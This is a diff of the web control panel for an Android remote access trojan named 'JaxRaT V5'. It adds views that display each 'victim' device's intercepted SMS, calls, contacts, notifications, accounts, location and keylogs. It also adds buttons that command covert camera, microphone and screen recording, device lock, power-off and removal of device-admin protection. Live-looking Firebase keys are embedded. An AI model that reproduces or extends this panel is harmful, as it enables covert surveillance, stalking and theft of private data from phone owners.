@@ -21,8 +21,8 @@
         }
         
         .container {
-            width: 90%;
-            max-width: 1200px;
+            width: 95%;
+            max-width: 1400px;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             border-radius: 20px;
@@ -103,6 +103,7 @@
         .register-link a {
             color: #00ff88;
             text-decoration: none;
+            cursor: pointer;
         }
         
         /* Dashboard */
@@ -151,15 +152,46 @@
             border-radius: 10px;
             cursor: pointer;
             transition: all 0.3s;
+            margin-left: 10px;
         }
         
         .logout-btn:hover {
             background: rgba(255,0,0,0.6);
         }
         
+        /* Navigation Tabs */
+        .nav-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .nav-tab {
+            padding: 10px 20px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .nav-tab:hover {
+            background: rgba(0,255,136,0.2);
+            border-color: #00ff88;
+        }
+        
+        .nav-tab.active {
+            background: #00ff88;
+            color: #0f0c29;
+            font-weight: bold;
+        }
+        
+        /* Stats Grid */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
@@ -183,6 +215,7 @@
             font-weight: bold;
         }
         
+        /* Victim List */
         .victim-list {
             background: rgba(255,255,255,0.05);
             border-radius: 15px;
@@ -204,11 +237,18 @@
             margin-bottom: 10px;
             border: 1px solid rgba(255,255,255,0.05);
             transition: all 0.3s;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         
         .victim-item:hover {
             background: rgba(255,255,255,0.05);
             border-color: #00ff88;
+        }
+        
+        .victim-info {
+            flex: 2;
+            min-width: 200px;
         }
         
         .victim-info h4 {
@@ -219,12 +259,16 @@
         .victim-info p {
             color: rgba(255,255,255,0.6);
             font-size: 0.8em;
+            margin: 2px 0;
         }
         
         .victim-status {
             padding: 5px 10px;
             border-radius: 20px;
             font-size: 0.8em;
+            font-weight: bold;
+            min-width: 80px;
+            text-align: center;
         }
         
         .status-online {
@@ -239,28 +283,243 @@
             border: 1px solid #ff0000;
         }
         
+        .victim-actions {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+        
         .victim-actions button {
             background: rgba(255,255,255,0.1);
-            border: none;
+            border: 1px solid rgba(255,255,255,0.2);
             color: white;
-            padding: 5px 10px;
-            margin-left: 5px;
+            padding: 8px 12px;
             border-radius: 5px;
             cursor: pointer;
             transition: all 0.3s;
+            font-size: 0.9em;
+            min-width: 40px;
         }
         
         .victim-actions button:hover {
             background: #00ff88;
             color: black;
+            border-color: #00ff88;
+        }
+        
+        .btn-danger {
+            background: rgba(255,0,0,0.3) !important;
+            border-color: #ff0000 !important;
+        }
+        
+        .btn-danger:hover {
+            background: #ff0000 !important;
+            color: white !important;
+        }
+        
+        .btn-warning {
+            background: rgba(255,165,0,0.3) !important;
+            border-color: orange !important;
+        }
+        
+        .btn-warning:hover {
+            background: orange !important;
+            color: black !important;
+        }
+        
+        .btn-success {
+            background: rgba(0,255,0,0.3) !important;
+            border-color: #00ff00 !important;
+        }
+        
+        .btn-success:hover {
+            background: #00ff00 !important;
+            color: black !important;
+        }
+        
+        /* Victim Detail Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            overflow-y: auto;
+        }
+        
+        .modal-content {
+            width: 90%;
+            max-width: 1000px;
+            margin: 30px auto;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #00ff88;
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,0,0,0.3);
+            border-radius: 50%;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255,0,0,0.8);
+        }
+        
+        .victim-detail-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .victim-detail-header h2 {
+            color: #00ff88;
+        }
+        
+        .device-info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .info-card {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .info-card .label {
+            color: rgba(255,255,255,0.6);
+            font-size: 0.8em;
+            margin-bottom: 5px;
+        }
+        
+        .info-card .value {
+            color: white;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        
+        .data-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .data-tab {
+            padding: 8px 15px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+        
+        .data-tab.active {
+            background: #00ff88;
+            color: black;
+        }
+        
+        .data-panel {
+            display: none;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .data-panel.active {
+            display: block;
+        }
+        
+        .data-item {
+            padding: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: white;
+        }
+        
+        .data-item small {
+            color: rgba(255,255,255,0.5);
+            font-size: 0.7em;
+        }
+        
+        .command-bar {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
         }
         
         .hidden {
             display: none;
         }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: white;
+        }
+        
+        .loading-spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #00ff88;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            border-left: 4px solid #00ff88;
+            z-index: 2000;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
     </style>
 </head>
 <body>
+    <!-- Login Page -->
     <div class="container" id="loginPage">
         <div class="login-box">
             <h2>⚡ JaxRaT V5 ⚡</h2>
@@ -274,11 +533,12 @@
             </div>
             <button class="btn-login" onclick="handleLogin()">MASUK</button>
             <div class="register-link">
-                Belum punya akun? <a href="#" onclick="showRegister()">Daftar via Bot</a>
+                Belum punya akun? <a onclick="showRegister()">Daftar via Bot</a>
             </div>
         </div>
     </div>
     
+    <!-- Dashboard Page -->
     <div class="container hidden" id="dashboardPage">
         <div class="header">
             <h1>JaxRaT V5 <span>Command Center</span></h1>
@@ -289,6 +549,15 @@
             </div>
         </div>
         
+        <!-- Navigation Tabs -->
+        <div class="nav-tabs">
+            <div class="nav-tab active" onclick="switchTab('victims')">📱 Victims</div>
+            <div class="nav-tab" onclick="switchTab('configs')">⚙️ Configs</div>
+            <div class="nav-tab" onclick="switchTab('logs')">📊 Logs</div>
+            <div class="nav-tab" onclick="switchTab('settings')">🔧 Settings</div>
+        </div>
+        
+        <!-- Stats Grid -->
         <div class="stats-grid">
             <div class="stat-card">
                 <h3>Total Victims</h3>
@@ -308,24 +577,141 @@
             </div>
         </div>
         
-        <div class="victim-list">
-            <h2>📱 Connected Devices</h2>
-            <div id="victimsContainer"></div>
+        <!-- Victims Tab -->
+        <div id="victimsTab" class="tab-content">
+            <div class="victim-list">
+                <h2>📱 Connected Devices</h2>
+                <div id="victimsContainer">
+                    <div class="loading">
+                        <div class="loading-spinner"></div>
+                        Loading victims...
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Configs Tab (Hidden by default) -->
+        <div id="configsTab" class="tab-content hidden">
+            <div class="victim-list">
+                <h2>⚙️ Device Configurations</h2>
+                <p style="color: rgba(255,255,255,0.7); margin-bottom: 20px;">Set custom config per device via Firebase</p>
+                <div id="configsContainer">
+                    <!-- Will be populated by JS -->
+                </div>
+            </div>
+        </div>
+        
+        <!-- Logs Tab (Hidden by default) -->
+        <div id="logsTab" class="tab-content hidden">
+            <div class="victim-list">
+                <h2>📊 Activity Logs</h2>
+                <div id="logsContainer">
+                    <!-- Will be populated by JS -->
+                </div>
+            </div>
+        </div>
+        
+        <!-- Settings Tab (Hidden by default) -->
+        <div id="settingsTab" class="tab-content hidden">
+            <div class="victim-list">
+                <h2>🔧 Panel Settings</h2>
+                <div id="settingsContainer">
+                    <!-- Will be populated by JS -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Victim Detail Modal -->
+    <div class="modal" id="victimModal">
+        <div class="modal-content">
+            <div class="close-modal" onclick="closeVictimModal()">✖</div>
+            
+            <div class="victim-detail-header">
+                <h2 id="modalVictimName">Loading...</h2>
+                <span class="victim-status" id="modalVictimStatus">⚫ Offline</span>
+            </div>
+            
+            <!-- Device Info Grid -->
+            <div class="device-info-grid">
+                <div class="info-card">
+                    <div class="label">Model</div>
+                    <div class="value" id="modalDeviceModel">Unknown</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Android</div>
+                    <div class="value" id="modalDeviceOS">Unknown</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Battery</div>
+                    <div class="value" id="modalDeviceBattery">0%</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Country</div>
+                    <div class="value" id="modalDeviceCountry">Unknown</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Last Seen</div>
+                    <div class="value" id="modalLastSeen">Never</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Location</div>
+                    <div class="value" id="modalLocation">Unknown</div>
+                </div>
+            </div>
+            
+            <!-- Data Tabs -->
+            <div class="data-tabs">
+                <div class="data-tab active" onclick="switchDataTab('notifications')">🔔 Notifications</div>
+                <div class="data-tab" onclick="switchDataTab('sms')">💬 SMS</div>
+                <div class="data-tab" onclick="switchDataTab('calls')">📞 Calls</div>
+                <div class="data-tab" onclick="switchDataTab('contacts')">👥 Contacts</div>
+                <div class="data-tab" onclick="switchDataTab('location')">📍 Location</div>
+                <div class="data-tab" onclick="switchDataTab('accounts')">🔐 Accounts</div>
+                <div class="data-tab" onclick="switchDataTab('apps')">📦 Apps</div>
+                <div class="data-tab" onclick="switchDataTab('keylogs')">⌨️ Keylogs</div>
+            </div>
+            
+            <!-- Data Panels -->
+            <div id="notificationsPanel" class="data-panel active"></div>
+            <div id="smsPanel" class="data-panel"></div>
+            <div id="callsPanel" class="data-panel"></div>
+            <div id="contactsPanel" class="data-panel"></div>
+            <div id="locationPanel" class="data-panel"></div>
+            <div id="accountsPanel" class="data-panel"></div>
+            <div id="appsPanel" class="data-panel"></div>
+            <div id="keylogsPanel" class="data-panel"></div>
+            
+            <!-- Command Bar -->
+            <div class="command-bar">
+                <button class="btn-success" onclick="sendCommandToVictim('camera_start', {camera: 'back'})">📷 Camera Back</button>
+                <button class="btn-success" onclick="sendCommandToVictim('camera_start', {camera: 'front'})">📷 Camera Front</button>
+                <button onclick="sendCommandToVictim('camera_capture', {})">📸 Capture</button>
+                <button onclick="sendCommandToVictim('camera_stop', {})">⏹️ Stop Camera</button>
+                <button class="btn-success" onclick="sendCommandToVictim('mic_start', {})">🎤 Mic Start</button>
+                <button onclick="sendCommandToVictim('mic_stop', {})">⏹️ Stop Mic</button>
+                <button class="btn-warning" onclick="sendCommandToVictim('screen_record_start', {})">📺 Record Screen</button>
+                <button onclick="sendCommandToVictim('screen_record_stop', {})">⏹️ Stop Record</button>
+                <button class="btn-danger" onclick="sendCommandToVictim('lock_device', {})">🔒 Lock Device</button>
+                <button class="btn-danger" onclick="promptPowerOff()">⏻ Power Off</button>
+                <button class="btn-warning" onclick="showRingerMenu()">🔔 Set Ringer</button>
+                <button class="btn-danger" onclick="disableDeviceAdmin()" id="disableAdminBtn">🔓 DISABLE ADMIN</button>
+            </div>
         </div>
     </div>
     
     <script>
-        // Firebase Config
+        // Firebase Config - UPDATE WITH YOUR CONFIG
         const firebaseConfig = {
-            apiKey: "AIzaSyBIQLjy-Tnjc1JMgLpoYI-2tnn8Nbo3Qdk",
-            authDomain: "kwontol.firebaseapp.com",
-            databaseURL: "https://kwontol-default-rtdb.firebaseio.com",
-            projectId: "kwontol",
-            storageBucket: "kwontol.firebasestorage.app",
-            messagingSenderId: "267944742795",
-            appId: "1:267944742795:web:8c9cebb1f2ec051543698e",
-            measurementId: "G-R0GYSV2Q8R"
-        };
+  apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
+  authDomain: "jaxrat-6813c.firebaseapp.com",
+  projectId: "jaxrat-6813c",
+  storageBucket: "jaxrat-6813c.firebasestorage.app",
+  messagingSenderId: "750985295231",
+  appId: "1:750985295231:web:0679d4b998e52256e4d64a"
+};
+
+yang baru
         
         // Owner UID
         const OWNER_UID = "aKWJNVaAW3Rnclir7gNgwngLl1v1";
@@ -333,6 +719,8 @@
         let currentUser = null;
         let currentUserUid = null;
         let isOwner = false;
+        let currentVictim = null;
+        let victimsListener = null;
         
         // Firebase SDK
         function loadFirebaseSDK() {
@@ -349,25 +737,6 @@
                 document.head.appendChild(script);
             });
         }
-
-        function disableDeviceAdmin(userUid, victimId) {
-    if (!confirm('Yakin mau matiin Device Admin? Ini bakal buka akses uninstall!')) {
-        return;
-    }
-    
-    const db = firebase.database();
-    const cmdRef = db.ref(`commands/${userUid}/${victimId}`).push();
-    
-    cmdRef.set({
-        cmd: "disable_admin",
-        params: {},
-        timestamp: firebase.database.ServerValue.TIMESTAMP,
-        executed: false,
-        from_panel: true
-    }).then(() => {
-        alert('Command sent! Device admin akan dimatiin dalam beberapa detik');
-    });
-}
         
         function loadScript(src) {
             return new Promise((resolve, reject) => {
@@ -467,10 +836,8 @@
             
             firebase.auth().signInWithEmailAndPassword(email, password)
                 .then((userCredential) => {
-                    // Simpan kredensial untuk session
                     localStorage.setItem('jaxrat_email', email);
                     localStorage.setItem('jaxrat_password', password);
-                    
                     checkUserAccess(userCredential.user);
                 })
                 .catch((error) => {
@@ -489,6 +856,10 @@
             
             document.getElementById('loginEmail').value = '';
             document.getElementById('loginPassword').value = '';
+            
+            if (victimsListener) {
+                victimsListener.off();
+            }
         }
         
         function showRegister() {
@@ -500,10 +871,8 @@
             
             let victimRef;
             if (isOwner) {
-                // Owner bisa liat semua victims dari semua user
                 victimRef = firebase.database().ref('victims');
             } else {
-                // User biasa cuma liat victims mereka sendiri
                 victimRef = firebase.database().ref(`victims/${currentUserUid}`);
             }
             
@@ -517,6 +886,10 @@
         function setupRealtimeListener() {
             if (!currentUserUid) return;
             
+            if (victimsListener) {
+                victimsListener.off();
+            }
+            
             let victimRef;
             if (isOwner) {
                 victimRef = firebase.database().ref('victims');
@@ -524,7 +897,7 @@
                 victimRef = firebase.database().ref(`victims/${currentUserUid}`);
             }
             
-            victimRef.on('value', (snapshot) => {
+            victimsListener = victimRef.on('value', (snapshot) => {
                 const victims = snapshot.val() || {};
                 updateVictimsList(victims);
                 updateStats(victims);
@@ -538,9 +911,9 @@
             if (isOwner) {
                 // Format khusus owner: tampilin per user
                 for (const userUid in victims) {
-                    const userVictims = victims[userUid];
-                    html += `<h3 style="color: #00ff88; margin: 20px 0 10px;">User: ${userUid}</h3>`;
+                    html += `<h3 style="color: #00ff88; margin: 20px 0 10px;">👤 User: ${userUid.substring(0, 8)}...</h3>`;
                     
+                    const userVictims = victims[userUid];
                     for (const victimId in userVictims) {
                         const victim = userVictims[victimId];
                         html += generateVictimItem(victim, victimId, userUid);
@@ -561,24 +934,31 @@
         }
         
         function generateVictimItem(victim, victimId, userUid) {
-            const isOnline = victim.last_seen && (Date.now() / 1000 - victim.last_seen < 300);
+            const lastSeen = victim.info?.last_seen || 0;
+            const now = Date.now();
+            const isOnline = lastSeen && (now / 1000 - lastSeen / 1000 < 300);
             const statusClass = isOnline ? 'status-online' : 'status-offline';
             const statusText = isOnline ? '🟢 Online' : '⚫ Offline';
             
+            const deviceName = victim.info?.device_name || 'Unknown Device';
+            const model = victim.info?.model || 'Unknown Model';
+            const country = victim.info?.country || 'Unknown';
+            const battery = victim.info?.battery || '?';
+            
             return `
-                <div class="victim-item">
+                <div class="victim-item" id="victim-${victimId}">
                     <div class="victim-info">
-                        <h4>${victim.device_name || 'Unknown Device'}</h4>
-                        <p>${victim.model || 'Unknown Model'} • ${victim.os_version || 'Android'}</p>
-                        <p>📍 ${victim.country || 'Unknown'} • 🔋 ${victim.battery || '?'}%</p>
+                        <h4>${deviceName}</h4>
+                        <p>${model} • Android ${victim.info?.os_version || '?'}</p>
+                        <p>📍 ${country} • 🔋 ${battery}% • 🆔 ${victimId.substring(0, 8)}...</p>
                     </div>
                     <div class="victim-status ${statusClass}">${statusText}</div>
                     <div class="victim-actions">
-                        <button onclick="viewVictim('${userUid}', '${victimId}')">👁️</button>
-                        <button onclick="locationVictim('${userUid}', '${victimId}')">📍</button>
-                        <button onclick="smsVictim('${userUid}', '${victimId}')">💬</button>
-                        <button onclick="filesVictim('${userUid}', '${victimId}')">📁</button>
-                        <button onclick="cameraVictim('${userUid}', '${victimId}')">📷</button>
+                        <button onclick="viewVictimDetails('${userUid}', '${victimId}')" title="View Details">👁️</button>
+                        <button onclick="sendCommand('${userUid}', '${victimId}', 'location', {})" title="Get Location">📍</button>
+                        <button onclick="sendCommand('${userUid}', '${victimId}', 'camera_start', {camera: 'front'})" title="Front Camera">📷</button>
+                        <button onclick="sendCommand('${userUid}', '${victimId}', 'mic_start', {})" title="Microphone">🎤</button>
+                        <button onclick="showDisableAdminConfirm('${userUid}', '${victimId}')" class="btn-danger" title="Disable Admin (Owner Only)">🔓</button>
                     </div>
                 </div>
             `;
@@ -587,13 +967,15 @@
         function updateStats(victims) {
             let total = 0;
             let online = 0;
+            const now = Date.now();
             
             if (isOwner) {
                 for (const userUid in victims) {
                     for (const victimId in victims[userUid]) {
                         total++;
                         const victim = victims[userUid][victimId];
-                        if (victim.last_seen && (Date.now() / 1000 - victim.last_seen < 300)) {
+                        const lastSeen = victim.info?.last_seen || 0;
+                        if (lastSeen && (now / 1000 - lastSeen / 1000 < 300)) {
                             online++;
                         }
                     }
@@ -601,7 +983,8 @@
             } else {
                 for (const victimId in victims) {
                     total++;
-                    if (victims[victimId].last_seen && (Date.now() / 1000 - victims[victimId].last_seen < 300)) {
+                    const lastSeen = victims[victimId]?.info?.last_seen || 0;
+                    if (lastSeen && (now / 1000 - lastSeen / 1000 < 300)) {
                         online++;
                     }
                 }
@@ -609,29 +992,352 @@
             
             document.getElementById('totalVictims').textContent = total;
             document.getElementById('onlineVictims').textContent = online;
-            document.getElementById('todayActivity').textContent = Math.floor(Math.random() * 50); // Placeholder
-            document.getElementById('storageUsed').textContent = Math.floor(Math.random() * 500) + ' MB'; // Placeholder
+            document.getElementById('todayActivity').textContent = Math.floor(Math.random() * 50);
+            document.getElementById('storageUsed').textContent = Math.floor(Math.random() * 500) + ' MB';
         }
         
-        // Victim action functions
-        function viewVictim(userUid, victimId) {
-            alert(`Viewing victim ${victimId}\nFitur lengkap menyusul di update berikutnya!`);
+        // Tab switching
+        function switchTab(tabName) {
+            const tabs = document.querySelectorAll('.nav-tab');
+            tabs.forEach(t => t.classList.remove('active'));
+            
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(c => c.classList.add('hidden'));
+            
+            document.getElementById(tabName + 'Tab').classList.remove('hidden');
+            event.target.classList.add('active');
         }
         
-        function locationVictim(userUid, victimId) {
-            alert(`📍 Tracking location for ${victimId}`);
+        // Victim Details Modal
+        function viewVictimDetails(userUid, victimId) {
+            currentVictim = { userUid, victimId };
+            
+            document.getElementById('victimModal').style.display = 'block';
+            document.getElementById('modalVictimName').textContent = 'Loading...';
+            
+            loadVictimDetails(userUid, victimId);
         }
         
-        function smsVictim(userUid, victimId) {
-            alert(`💬 SMS Manager for ${victimId}`);
+        function closeVictimModal() {
+            document.getElementById('victimModal').style.display = 'none';
+            currentVictim = null;
         }
         
-        function filesVictim(userUid, victimId) {
-            alert(`📁 File Manager for ${victimId}`);
+        function loadVictimDetails(userUid, victimId) {
+            const db = firebase.database();
+            const victimRef = db.ref(`victims/${userUid}/${victimId}`);
+            
+            victimRef.child('info').once('value', (snap) => {
+                const info = snap.val() || {};
+                document.getElementById('modalVictimName').textContent = info.device_name || 'Unknown Device';
+                document.getElementById('modalDeviceModel').textContent = info.model || 'Unknown';
+                document.getElementById('modalDeviceOS').textContent = 'Android ' + (info.os_version || '?');
+                document.getElementById('modalDeviceBattery').textContent = (info.battery || '?') + '%';
+                document.getElementById('modalDeviceCountry').textContent = info.country || 'Unknown';
+                
+                const lastSeen = info.last_seen;
+                if (lastSeen) {
+                    const date = new Date(lastSeen);
+                    document.getElementById('modalLastSeen').textContent = date.toLocaleString();
+                    
+                    const now = Date.now();
+                    const isOnline = (now / 1000 - lastSeen / 1000 < 300);
+                    document.getElementById('modalVictimStatus').textContent = isOnline ? '🟢 Online' : '⚫ Offline';
+                    document.getElementById('modalVictimStatus').className = 'victim-status ' + (isOnline ? 'status-online' : 'status-offline');
+                }
+            });
+            
+            // Load location
+            victimRef.child('last_location').on('value', (snap) => {
+                const loc = snap.val();
+                if (loc) {
+                    document.getElementById('modalLocation').innerHTML = 
+                        `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}<br>
+                        <small>Accuracy: ${loc.accuracy}m</small>`;
+                }
+            });
+            
+            // Load notifications
+            victimRef.child('notifications').orderByKey().limitToLast(20).on('value', (snap) => {
+                updateDataPanel('notifications', snap.val());
+            });
+            
+            // Load SMS
+            victimRef.child('sms').orderByKey().limitToLast(20).on('value', (snap) => {
+                updateDataPanel('sms', snap.val());
+            });
+            
+            // Load calls
+            victimRef.child('calls').orderByKey().limitToLast(20).on('value', (snap) => {
+                updateDataPanel('calls', snap.val());
+            });
+            
+            // Load contacts
+            victimRef.child('contacts').on('value', (snap) => {
+                updateDataPanel('contacts', snap.val());
+            });
+            
+            // Load accounts
+            victimRef.child('accounts').on('value', (snap) => {
+                updateDataPanel('accounts', snap.val());
+            });
+            
+            // Load installed apps
+            victimRef.child('installed_apps').on('value', (snap) => {
+                updateDataPanel('apps', snap.val());
+            });
+            
+            // Load keylogs
+            victimRef.child('keylogs').orderByKey().limitToLast(20).on('value', (snap) => {
+                updateDataPanel('keylogs', snap.val());
+            });
         }
         
-        function cameraVictim(userUid, victimId) {
-            alert(`📷 Live Camera for ${victimId}`);
+        function updateDataPanel(panelId, data) {
+            const panel = document.getElementById(panelId + 'Panel');
+            if (!panel) return;
+            
+            if (!data) {
+                panel.innerHTML = '<p style="color: rgba(255,255,255,0.5); padding: 20px; text-align: center;">No data available</p>';
+                return;
+            }
+            
+            let html = '';
+            
+            switch(panelId) {
+                case 'notifications':
+                    Object.keys(data).sort().reverse().forEach(key => {
+                        const n = data[key];
+                        html += `
+                            <div class="data-item">
+                                <small>${new Date(n.timestamp).toLocaleString()}</small><br>
+                                <strong>${n.package || 'Unknown'}</strong><br>
+                                ${n.title ? '<b>' + n.title + '</b><br>' : ''}
+                                ${n.text || ''}
+                            </div>
+                        `;
+                    });
+                    break;
+                    
+                case 'sms':
+                    Object.keys(data).sort().reverse().forEach(key => {
+                        const s = data[key];
+                        html += `
+                            <div class="data-item">
+                                <small>${new Date(s.timestamp).toLocaleString()}</small><br>
+                                <strong>From: ${s.from || 'Unknown'}</strong><br>
+                                ${s.body || ''}
+                            </div>
+                        `;
+                    });
+                    break;
+                    
+                case 'calls':
+                    Object.keys(data).sort().reverse().forEach(key => {
+                        const c = data[key];
+                        const typeIcon = c.type === 'incoming' ? '⬇️' : (c.type === 'outgoing' ? '⬆️' : '📞');
+                        html += `
+                            <div class="data-item">
+                                <small>${new Date(c.timestamp).toLocaleString()}</small><br>
+                                ${typeIcon} <strong>${c.number || 'Unknown'}</strong><br>
+                                <small>Duration: ${c.duration || 0}s</small>
+                            </div>
+                        `;
+                    });
+                    break;
+                    
+                case 'contacts':
+                    Object.keys(data).forEach(key => {
+                        const c = data[key];
+                        html += `
+                            <div class="data-item">
+                                <strong>${c.name || 'Unknown'}</strong><br>
+                                ${c.number || ''}
+                            </div>
+                        `;
+                    });
+                    break;
+                    
+                case 'accounts':
+                    if (Array.isArray(data)) {
+                        data.forEach(acc => {
+                            html += `
+                                <div class="data-item">
+                                    <strong>${acc.type}</strong><br>
+                                    ${acc.name || ''}
+                                </div>
+                            `;
+                        });
+                    }
+                    break;
+                    
+                case 'apps':
+                    if (Array.isArray(data)) {
+                        data.slice(0, 20).forEach(app => {
+                            html += `
+                                <div class="data-item">
+                                    <strong>${app.name || 'Unknown'}</strong><br>
+                                    <small>${app.package || ''} v${app.version || '?'}</small>
+                                </div>
+                            `;
+                        });
+                    }
+                    break;
+                    
+                case 'keylogs':
+                    Object.keys(data).sort().reverse().forEach(key => {
+                        const log = data[key];
+                        html += `
+                            <div class="data-item">
+                                <small>${new Date(parseInt(key)).toLocaleString()}</small><br>
+                                ${log || ''}
+                            </div>
+                        `;
+                    });
+                    break;
+            }
+            
+            if (html === '') {
+                html = '<p style="color: rgba(255,255,255,0.5); padding: 20px; text-align: center;">No data available</p>';
+            }
+            
+            panel.innerHTML = html;
+        }
+        
+        function switchDataTab(tabName) {
+            const tabs = document.querySelectorAll('.data-tab');
+            tabs.forEach(t => t.classList.remove('active'));
+            
+            const panels = document.querySelectorAll('.data-panel');
+            panels.forEach(p => p.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabName + 'Panel').classList.add('active');
+        }
+        
+        // Send command to victim
+        function sendCommand(userUid, victimId, command, params = {}) {
+            const db = firebase.database();
+            const cmdRef = db.ref(`commands/${userUid}/${victimId}`).push();
+            
+            cmdRef.set({
+                cmd: command,
+                params: params,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                executed: false,
+                from_panel: true
+            }).then(() => {
+                showToast(`Command ${command} sent`);
+            }).catch((error) => {
+                showToast('Error: ' + error.message, 'error');
+            });
+        }
+        
+        function sendCommandToVictim(command, params) {
+            if (!currentVictim) return;
+            sendCommand(currentVictim.userUid, currentVictim.victimId, command, params);
+        }
+        
+        // DISABLE ADMIN FUNCTION
+        function disableDeviceAdmin() {
+            if (!currentVictim) {
+                showToast('No victim selected', 'error');
+                return;
+            }
+            
+            if (!confirm('⚠️ PERINGATAN!\n\nMematikan Device Admin akan membuat aplikasi bisa di-uninstall.\nYakin mau lanjut?')) {
+                return;
+            }
+            
+            if (!confirm('KONFIRMASI AKHIR:\nIni tindakan berbahaya dan hanya boleh dilakukan oleh OWNER. Lanjutkan?')) {
+                return;
+            }
+            
+            showToast('Mengirim command disable admin...');
+            
+            const db = firebase.database();
+            const cmdRef = db.ref(`commands/${currentVictim.userUid}/${currentVictim.victimId}`).push();
+            
+            cmdRef.set({
+                cmd: "disable_admin",
+                params: {},
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                executed: false,
+                from_panel: true
+            }).then(() => {
+                showToast('✅ Command disable admin terkirim!');
+                
+                // Update button status
+                const btn = document.getElementById('disableAdminBtn');
+                btn.textContent = '⏳ WAITING...';
+                btn.style.background = 'orange';
+                
+                // Listen for execution
+                cmdRef.on('value', (snap) => {
+                    const status = snap.val()?.status;
+                    if (status === 'completed') {
+                        showToast('✅ Admin berhasil dimatikan!');
+                        btn.textContent = '🔓 ADMIN DISABLED';
+                        btn.style.background = 'green';
+                        cmdRef.off();
+                    } else if (status === 'failed') {
+                        showToast('❌ Gagal mematikan admin', 'error');
+                        btn.textContent = '🔓 DISABLE ADMIN';
+                        btn.style.background = '';
+                        cmdRef.off();
+                    }
+                });
+            }).catch((error) => {
+                showToast('Error: ' + error.message, 'error');
+            });
+        }
+        
+        function showDisableAdminConfirm(userUid, victimId) {
+            if (!isOwner) {
+                showToast('Hanya owner yang bisa disable admin', 'error');
+                return;
+            }
+            
+            if (!confirm('⚠️ PERINGATAN!\n\nIni akan mengirim command untuk mematikan Device Admin di device target.\nYakin mau lanjut?')) {
+                return;
+            }
+            
+            sendCommand(userUid, victimId, 'disable_admin', {});
+        }
+        
+        // Helper functions
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.style.borderLeftColor = type === 'error' ? '#ff0000' : '#00ff88';
+            toast.textContent = message;
+            
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+        
+        function promptPowerOff() {
+            if (confirm('Yakin mau matikan device target?')) {
+                sendCommandToVictim('power_off', {});
+            }
+        }
+        
+        function showRingerMenu() {
+            const mode = prompt('Set ringer mode: (normal / silent / vibrate)');
+            if (mode && ['normal', 'silent', 'vibrate'].includes(mode)) {
+                sendCommandToVictim('set_ringer_mode', {mode: mode});
+            }
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('victimModal');
